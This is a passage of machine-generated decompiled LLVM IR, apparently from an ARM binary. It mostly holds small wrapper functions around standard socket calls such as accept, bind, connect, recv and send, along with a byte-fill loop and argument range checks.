dec_label_pc_13cf8:                               ; preds = %dec_label_pc_13cb4, %dec_label_pc_13cc0.dec_label_pc_13cf8.loopexit_crit_edge, %dec_label_pc_13cb8.dec_label_pc_13cf8.loopexit_crit_edge, %dec_label_pc_13cd0.dec_label_pc_13cf8.loopexit_crit_edge, %dec_label_pc_13ce0.dec_label_pc_13cf8.loopexit_crit_edge, %dec_label_pc_13c90
  %v0_13d00 = phi i32 [ %v0_13c94, %dec_label_pc_13c90 ], [ %v1_13ce4, %dec_label_pc_13ce0.dec_label_pc_13cf8.loopexit_crit_edge ], [ %v1_13cd4, %dec_label_pc_13cd0.dec_label_pc_13cf8.loopexit_crit_edge ], [ %v7_13cf0, %dec_label_pc_13cb8.dec_label_pc_13cf8.loopexit_crit_edge ], [ %v1_13cc4.lcssa, %dec_label_pc_13cc0.dec_label_pc_13cf8.loopexit_crit_edge ], [ %v0_13cb8.pr, %dec_label_pc_13cb4 ]
  %v2_13cf8 = icmp eq i32 %v0_13d00, 0
  store i1 %v2_13cf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cf8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13cf8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13cf8
  %v1_13d00 = sub i32 7, %v0_13d00
  store i32 %v1_13d00, i32* %r2.global-to-local, align 4
  %v3_13d04 = mul i32 %v1_13d00, 4
  %v4_13d04 = add i32 %v3_13d04, ptrtoint (i32* @global_var_13d0c.609 to i32)
  call void @__pseudo_branch(i32 %v4_13d04)
  %v0_13d0c = load i32, i32* %r1.global-to-local, align 4
  %v1_13d0c = trunc i32 %v0_13d0c to i8
  %v2_13d0c = load i32, i32* %r3.global-to-local, align 4
  %v3_13d0c = inttoptr i32 %v2_13d0c to i8*
  store i8 %v1_13d0c, i8* %v3_13d0c, align 1
  %v4_13d0c = load i32, i32* %r3.global-to-local, align 4
  %v5_13d0c = add i32 %v4_13d0c, 1
  store i32 %v5_13d0c, i32* %r3.global-to-local, align 4
  %v0_13d10 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d10 = trunc i32 %v0_13d10 to i8
  %v3_13d10 = inttoptr i32 %v5_13d0c to i8*
  store i8 %v1_13d10, i8* %v3_13d10, align 1
  %v4_13d10 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d10 = add i32 %v4_13d10, 1
  store i32 %v5_13d10, i32* %r3.global-to-local, align 4
  %v0_13d14 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d14 = trunc i32 %v0_13d14 to i8
  %v3_13d14 = inttoptr i32 %v5_13d10 to i8*
  store i8 %v1_13d14, i8* %v3_13d14, align 1
  %v4_13d14 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d14 = add i32 %v4_13d14, 1
  store i32 %v5_13d14, i32* %r3.global-to-local, align 4
  %v0_13d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d18 = trunc i32 %v0_13d18 to i8
  %v3_13d18 = inttoptr i32 %v5_13d14 to i8*
  store i8 %v1_13d18, i8* %v3_13d18, align 1
  %v4_13d18 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d18 = add i32 %v4_13d18, 1
  store i32 %v5_13d18, i32* %r3.global-to-local, align 4
  %v0_13d1c = load i32, i32* %r1.global-to-local, align 4
  %v1_13d1c = trunc i32 %v0_13d1c to i8
  %v3_13d1c = inttoptr i32 %v5_13d18 to i8*
  store i8 %v1_13d1c, i8* %v3_13d1c, align 1
  %v4_13d1c = load i32, i32* %r3.global-to-local, align 4
  %v5_13d1c = add i32 %v4_13d1c, 1
  store i32 %v5_13d1c, i32* %r3.global-to-local, align 4
  %v0_13d20 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d20 = trunc i32 %v0_13d20 to i8
  %v3_13d20 = inttoptr i32 %v5_13d1c to i8*
  store i8 %v1_13d20, i8* %v3_13d20, align 1
  %v4_13d20 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d20 = add i32 %v4_13d20, 1
  store i32 %v5_13d20, i32* %r3.global-to-local, align 4
  %v0_13d24 = load i32, i32* %r1.global-to-local, align 4
  %v1_13d24 = trunc i32 %v0_13d24 to i8
  %v3_13d24 = inttoptr i32 %v5_13d20 to i8*
  store i8 %v1_13d24, i8* %v3_13d24, align 1
  %v4_13d24 = load i32, i32* %r3.global-to-local, align 4
  %v5_13d24 = add i32 %v4_13d24, 1
  store i32 %v5_13d24, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13cc0, { 1, 0 }
  uselistorder i32 %v12_13cec, { 1, 2, 0 }
  uselistorder i32 %v0_13cc054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13cb8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13ca8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_13c9c, { 1, 0 }
  uselistorder i32 %v0_13c94, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 4, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13cf8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13cd0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_13d30(i32 %arg1) local_unnamed_addr {
dec_label_pc_13d30:
  %stack_var_-8 = alloca i32, align 4
  %v2_13d34 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_13d34, i32* @r1, align 4
  %v0_13d3c = call i32 @function_15d40()
  %v2_13d40 = icmp eq i32 %v0_13d3c, 0
  br i1 %v2_13d40, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13d30
  %v3_13d48 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13d30, %bb
  %v5_13d50 = phi i32 [ -1, %dec_label_pc_13d30 ], [ %v3_13d48, %bb ]
  ret i32 %v5_13d50

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13d54(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13d54:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d54 = load i32, i32* @r4, align 4
  store i32 %v3_13d54, i32* %stack_var_-8, align 4
  %v5_13d58 = inttoptr i32 %arg3 to i32*
  %v6_13d58 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_13d58)
  store i32 %v6_13d58, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_13d58, -4095
  br i1 %tmp, label %dec_label_pc_13d78, label %dec_label_pc_13d68

dec_label_pc_13d68:                               ; preds = %dec_label_pc_13d54
  %v0_13d68 = call i32 @function_13c28()
  %v0_13d6c = load i32, i32* %r4.global-to-local, align 4
  %v1_13d6c = sub i32 0, %v0_13d6c
  %v2_13d70 = inttoptr i32 %v0_13d68 to i32*
  store i32 %v1_13d6c, i32* %v2_13d70, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13d78

dec_label_pc_13d78:                               ; preds = %dec_label_pc_13d54, %dec_label_pc_13d68
  %v0_13d78 = phi i32 [ %v6_13d58, %dec_label_pc_13d54 ], [ -1, %dec_label_pc_13d68 ]
  %v2_13d7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d7c, i32* @r4, align 4
  ret i32 %v0_13d78

; uselistorder directives
  uselistorder i32 %v6_13d58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d78, { 1, 0 }
}

define i32 @function_13d80(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13d80:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d80 = load i32, i32* @r4, align 4
  store i32 %v3_13d80, i32* %stack_var_-8, align 4
  %v5_13d84 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_13d84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13d84, -4095
  br i1 %tmp, label %dec_label_pc_13da4, label %dec_label_pc_13d94

dec_label_pc_13d94:                               ; preds = %dec_label_pc_13d80
  %v0_13d94 = call i32 @function_13c28()
  %v0_13d98 = load i32, i32* %r4.global-to-local, align 4
  %v1_13d98 = sub i32 0, %v0_13d98
  %v2_13d9c = inttoptr i32 %v0_13d94 to i32*
  store i32 %v1_13d98, i32* %v2_13d9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %dec_label_pc_13d80, %dec_label_pc_13d94
  %v0_13da4 = phi i32 [ %v5_13d84, %dec_label_pc_13d80 ], [ -1, %dec_label_pc_13d94 ]
  %v2_13da8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13da8, i32* @r4, align 4
  ret i32 %v0_13da4

; uselistorder directives
  uselistorder i32 %v5_13d84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13da4, { 1, 0 }
}

define i32 @function_13dac(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13dac:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13dac = load i32, i32* @r4, align 4
  store i32 %v3_13dac, i32* %stack_var_-8, align 4
  %v5_13db0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_13db0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13db0, -4095
  br i1 %tmp, label %dec_label_pc_13dd0, label %dec_label_pc_13dc0

dec_label_pc_13dc0:                               ; preds = %dec_label_pc_13dac
  %v0_13dc0 = call i32 @function_13c28()
  %v0_13dc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13dc4 = sub i32 0, %v0_13dc4
  %v2_13dc8 = inttoptr i32 %v0_13dc0 to i32*
  store i32 %v1_13dc4, i32* %v2_13dc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13dd0

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dac, %dec_label_pc_13dc0
  %v0_13dd0 = phi i32 [ %v5_13db0, %dec_label_pc_13dac ], [ -1, %dec_label_pc_13dc0 ]
  %v2_13dd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13dd4, i32* @r4, align 4
  ret i32 %v0_13dd0

; uselistorder directives
  uselistorder i32 %v5_13db0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13dd0, { 1, 0 }
}

define i32 @function_13dd8(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13dd8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13dd8 = load i32, i32* @r4, align 4
  store i32 %v3_13dd8, i32* %stack_var_-8, align 4
  %v5_13ddc = inttoptr i32 %arg3 to i32*
  %v6_13ddc = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_13ddc)
  store i32 %v6_13ddc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_13ddc, -4095
  br i1 %tmp, label %dec_label_pc_13dfc, label %dec_label_pc_13dec

dec_label_pc_13dec:                               ; preds = %dec_label_pc_13dd8
  %v0_13dec = call i32 @function_13c28()
  %v0_13df0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13df0 = sub i32 0, %v0_13df0
  %v2_13df4 = inttoptr i32 %v0_13dec to i32*
  store i32 %v1_13df0, i32* %v2_13df4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13dfc

dec_label_pc_13dfc:                               ; preds = %dec_label_pc_13dd8, %dec_label_pc_13dec
  %v0_13dfc = phi i32 [ %v6_13ddc, %dec_label_pc_13dd8 ], [ -1, %dec_label_pc_13dec ]
  %v2_13e00 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e00, i32* @r4, align 4
  ret i32 %v0_13dfc

; uselistorder directives
  uselistorder i32 %v6_13ddc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13dfc, { 1, 0 }
}

define i32 @function_13e04(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13e04:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e04 = load i32, i32* @r4, align 4
  store i32 %v3_13e04, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13e0c = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  store i32 %v5_13e0c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13e0c, -4095
  br i1 %tmp, label %dec_label_pc_13e2c, label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e04
  %v0_13e1c = call i32 @function_13c28()
  %v0_13e20 = load i32, i32* %r4.global-to-local, align 4
  %v1_13e20 = sub i32 0, %v0_13e20
  %v2_13e24 = inttoptr i32 %v0_13e1c to i32*
  store i32 %v1_13e20, i32* %v2_13e24, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e2c

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13e04, %dec_label_pc_13e1c
  %v0_13e2c = phi i32 [ %v5_13e0c, %dec_label_pc_13e04 ], [ -1, %dec_label_pc_13e1c ]
  %v2_13e30 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e30, i32* @r4, align 4
  ret i32 %v0_13e2c

; uselistorder directives
  uselistorder i32 %v5_13e0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e2c, { 1, 0 }
}

define i32 @function_13e34(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e34:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e34 = load i32, i32* @r4, align 4
  store i32 %v3_13e34, i32* %stack_var_-8, align 4
  %v2_13e38 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_13e38, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_13e38, -4095
  br i1 %tmp, label %dec_label_pc_13e58, label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e34
  %v0_13e48 = call i32 @function_13c28()
  %v0_13e4c = load i32, i32* %r4.global-to-local, align 4
  %v1_13e4c = sub i32 0, %v0_13e4c
  %v2_13e50 = inttoptr i32 %v0_13e48 to i32*
  store i32 %v1_13e4c, i32* %v2_13e50, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e58

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e34, %dec_label_pc_13e48
  %v0_13e58 = phi i32 [ %v2_13e38, %dec_label_pc_13e34 ], [ -1, %dec_label_pc_13e48 ]
  %v2_13e5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e5c, i32* @r4, align 4
  ret i32 %v0_13e58

; uselistorder directives
  uselistorder i32 %v2_13e38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e58, { 1, 0 }
}

define i32 @function_13e60(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13e60:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e60 = load i32, i32* @r4, align 4
  store i32 %v3_13e60, i32* %stack_var_-8, align 4
  %v5_13e64 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_13e64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13e64, -4095
  br i1 %tmp, label %dec_label_pc_13e84, label %dec_label_pc_13e74

dec_label_pc_13e74:                               ; preds = %dec_label_pc_13e60
  %v0_13e74 = call i32 @function_13c28()
  %v0_13e78 = load i32, i32* %r4.global-to-local, align 4
  %v1_13e78 = sub i32 0, %v0_13e78
  %v2_13e7c = inttoptr i32 %v0_13e74 to i32*
  store i32 %v1_13e78, i32* %v2_13e7c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13e84

dec_label_pc_13e84:                               ; preds = %dec_label_pc_13e60, %dec_label_pc_13e74
  %v0_13e84 = phi i32 [ %v5_13e64, %dec_label_pc_13e60 ], [ -1, %dec_label_pc_13e74 ]
  %v2_13e88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e88, i32* @r4, align 4
  ret i32 %v0_13e84

; uselistorder directives
  uselistorder i32 %v5_13e64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e84, { 1, 0 }
}

define i32 @function_13e8c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13e8c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13e8c = load i32, i32* @r4, align 4
  store i32 %v3_13e8c, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13e98 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  store i32 %v5_13e98, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13e98, -4095
  br i1 %tmp, label %dec_label_pc_13eb8, label %dec_label_pc_13ea8

dec_label_pc_13ea8:                               ; preds = %dec_label_pc_13e8c
  %v0_13ea8 = call i32 @function_13c28()
  %v0_13eac = load i32, i32* %r4.global-to-local, align 4
  %v1_13eac = sub i32 0, %v0_13eac
  %v2_13eb0 = inttoptr i32 %v0_13ea8 to i32*
  store i32 %v1_13eac, i32* %v2_13eb0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13eb8

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e8c, %dec_label_pc_13ea8
  %v0_13eb8 = phi i32 [ %v5_13e98, %dec_label_pc_13e8c ], [ -1, %dec_label_pc_13ea8 ]
  %v2_13ebc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13ebc, i32* @r4, align 4
  ret i32 %v0_13eb8

; uselistorder directives
  uselistorder i32 %v5_13e98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13eb8, { 1, 0 }
}

define i32 @function_13ec0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13ec0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ec0 = load i32, i32* @r4, align 4
  store i32 %v3_13ec0, i32* %stack_var_-8, align 4
  %v5_13ec4 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_13ec4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13ec4, -4095
  br i1 %tmp, label %dec_label_pc_13ee4, label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ec0
  %v0_13ed4 = call i32 @function_13c28()
  %v0_13ed8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ed8 = sub i32 0, %v0_13ed8
  %v2_13edc = inttoptr i32 %v0_13ed4 to i32*
  store i32 %v1_13ed8, i32* %v2_13edc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ee4

dec_label_pc_13ee4:                               ; preds = %dec_label_pc_13ec0, %dec_label_pc_13ed4
  %v0_13ee4 = phi i32 [ %v5_13ec4, %dec_label_pc_13ec0 ], [ -1, %dec_label_pc_13ed4 ]
  %v2_13ee8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ee8, i32* @r4, align 4
  ret i32 %v0_13ee4

; uselistorder directives
  uselistorder i32 %v5_13ec4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ee4, { 1, 0 }
}

define i32 @function_13eec(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_13eec:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13ef8 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_13ef8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13ef8, -4095
  br i1 %tmp, label %dec_label_pc_13f18, label %dec_label_pc_13f08

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13eec
  %v0_13f08 = call i32 @function_13c28()
  %v0_13f0c = load i32, i32* %r4.global-to-local, align 4
  %v1_13f0c = sub i32 0, %v0_13f0c
  %v2_13f10 = inttoptr i32 %v0_13f08 to i32*
  store i32 %v1_13f0c, i32* %v2_13f10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f18

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13eec, %dec_label_pc_13f08
  %v0_13f18 = phi i32 [ %v5_13ef8, %dec_label_pc_13eec ], [ -1, %dec_label_pc_13f08 ]
  ret i32 %v0_13f18

; uselistorder directives
  uselistorder i32 %v5_13ef8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f18, { 1, 0 }
}

define i32 @function_13f20(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_13f20:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f20 = load i32, i32* @r4, align 4
  store i32 %v3_13f20, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_13f28 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_13f28, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13f28, -4095
  br i1 %tmp, label %dec_label_pc_13f48, label %dec_label_pc_13f38

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13f20
  %v0_13f38 = call i32 @function_13c28()
  %v0_13f3c = load i32, i32* %r4.global-to-local, align 4
  %v1_13f3c = sub i32 0, %v0_13f3c
  %v2_13f40 = inttoptr i32 %v0_13f38 to i32*
  store i32 %v1_13f3c, i32* %v2_13f40, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f48

dec_label_pc_13f48:                               ; preds = %dec_label_pc_13f20, %dec_label_pc_13f38
  %v0_13f48 = phi i32 [ %v5_13f28, %dec_label_pc_13f20 ], [ -1, %dec_label_pc_13f38 ]
  %v2_13f4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f4c, i32* @r4, align 4
  ret i32 %v0_13f48

; uselistorder directives
  uselistorder i32 %v5_13f28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f48, { 1, 0 }
}

define i32 @function_13f50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13f50:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f50 = load i32, i32* @r4, align 4
  store i32 %v3_13f50, i32* %stack_var_-8, align 4
  %v3_13f54 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_13f54, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_13f54, -4095
  br i1 %tmp, label %dec_label_pc_13f74, label %dec_label_pc_13f64

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f50
  %v0_13f64 = call i32 @function_13c28()
  %v0_13f68 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f68 = sub i32 0, %v0_13f68
  %v2_13f6c = inttoptr i32 %v0_13f64 to i32*
  store i32 %v1_13f68, i32* %v2_13f6c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f74

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f50, %dec_label_pc_13f64
  %v0_13f74 = phi i32 [ %v3_13f54, %dec_label_pc_13f50 ], [ -1, %dec_label_pc_13f64 ]
  %v2_13f78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f78, i32* @r4, align 4
  ret i32 %v0_13f74

; uselistorder directives
  uselistorder i32 %v3_13f54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13f74, { 1, 0 }
}

define i32 @function_13f7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_13f7c:
  %v3_13f7c = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_13f84 = call i32 @function_136ac()
  %v0_13f88 = load i32, i32* @r4, align 4
  store i32 %v3_13f7c, i32* @r4, align 4
  %v2_13f90 = call i32 @function_13754(i32 %v0_13f84, i32 %v0_13f88)
  ret i32 %v2_13f90

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_13754, { 14, 15, 9, 13, 12, 11, 10, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_136ac, { 0, 1, 3, 2 }
}

define i32 @function_13f94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13f94:
  store i32 %arg1, i32* @r1, align 4
  %tmp2 = icmp slt i32 %arg1, 1
  br i1 %tmp2, label %dec_label_pc_13fb0, label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_13f94
  %v8_13fa4 = icmp sgt i32 %arg1, 64
  br i1 %v8_13fa4, label %dec_label_pc_13fb0, label %dec_label_pc_13fa8

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13fa0
  %v0_13fac = call i32 @function_140b8()
  br label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13fa0, %dec_label_pc_13f94, %dec_label_pc_13fa8
  %v0_13fb0 = call i32 @function_13c28()
  %v2_13fb8 = inttoptr i32 %v0_13fb0 to i32*
  store i32 22, i32* %v2_13fb8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fb0, { 2, 0, 1 }
}

define i32 @function_13fc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_13fc4:
  store i32 128, i32* @r2, align 4
  %v0_13fd0 = load i32, i32* @r0, align 4
  %v2_13fd0 = inttoptr i32 %v0_13fd0 to i8*
  %v3_13fd0 = call i32 @function_13c90(i8* %v2_13fd0, i32 0)
  ret i32 0
}

define i32 @function_13fdc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13fdc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13fdc = load i32, i32* @r4, align 4
  store i32 %v3_13fdc, i32* %stack_var_-12, align 4
  %v6_13fdc = load i32, i32* @r5, align 4
  %v10_13fdc = ptrtoint i32* %stack_var_-12 to i32
  %v7_13fe0 = icmp eq i32 %arg2, -1
  %v0_13fec.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_13fe0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13fdc
  br label %dec_label_pc_14004

bb:                                               ; preds = %dec_label_pc_13fdc
  %v2_13fe8 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_13fec.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_13fec.pre, 1
  br i1 %tmp19, label %dec_label_pc_14004, label %dec_label_pc_13ff4

dec_label_pc_13ff4:                               ; preds = %bb
  %v7_13ff8 = icmp sgt i32 %v0_13fec.pre, 64
  br i1 %v7_13ff8, label %dec_label_pc_14004, label %bb20

bb20:                                             ; preds = %dec_label_pc_13ff4
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_1402824 = add i32 %v10_13fdc, 124
  br label %dec_label_pc_14018

dec_label_pc_14004:                               ; preds = %.thread, %dec_label_pc_13ff4, %bb
  %v0_14004 = call i32 @function_13c28()
  store i32 %v0_14004, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r2, align 4
  %v2_14010 = inttoptr i32 %v0_14004 to i32*
  store i32 22, i32* %v2_14010, align 4
  %v0_14084.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14084

dec_label_pc_14018:                               ; preds = %bb20, %dec_label_pc_14018
  %v5_1402825 = phi i32 [ %v5_1402824, %bb20 ], [ %v5_14028, %dec_label_pc_14018 ]
  %v2_1401c = add i32 %v5_1402825, -136
  %v3_1401c = inttoptr i32 %v2_1401c to i32*
  store i32 0, i32* %v3_1401c, align 4
  %v0_14020.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_14020 = add i32 %v0_14020.pre, -1
  store i32 %v1_14020, i32* %r0.global-to-local, align 4
  %v6_14020 = icmp slt i32 %v1_14020, 0
  %v4_14028 = mul i32 %v1_14020, 4
